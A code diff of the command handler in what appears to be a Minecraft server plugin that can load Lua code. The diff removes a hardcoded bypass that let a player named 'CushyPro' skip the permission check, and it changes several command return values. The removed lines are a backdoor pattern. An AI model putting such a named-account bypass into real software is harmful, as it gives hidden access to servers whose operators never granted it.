@@ -23,10 +23,8 @@ public class Commands implements CommandExecutor {
 		}
 
 		if (!sender.hasPermission("hana.use*")) {
-			if (!sender.getName().equals("CushyPro")) {
-				sender.sendMessage("" + MessageType.NOPERMISSION.toString());
-				return false;
-			}
+			sender.sendMessage("" + MessageType.NOPERMISSION.toString());
+			return false;
 		}
 
 		if (args.length == 0) {
@@ -55,7 +53,7 @@ public class Commands implements CommandExecutor {
 				player = (Player) sender;
 			}
 			readCodeHana.load(player, m);
-			return false;
+			return true;
 		}
 
 		if (args[0].equalsIgnoreCase("luafile")) {
@@ -72,7 +70,7 @@ public class Commands implements CommandExecutor {
 						ChatColor.GREEN + luaFile.getFile().getName() + " - &5" + luaFile.getFile().length() + " B"));
 			}
 			sender.sendMessage(ChatColor.YELLOW + "============================");
-			return false;
+			return true;
 		}
 
 		if (args[0].equalsIgnoreCase("saveconfig")) {
@@ -83,7 +81,7 @@ public class Commands implements CommandExecutor {
 			Data.saveConfig();
 			Data.loadFileConfig();
 			sender.sendMessage("saveconfig");
-			return false;
+			return true;
 		}
 
 		if (args[0].equalsIgnoreCase("reload")) {
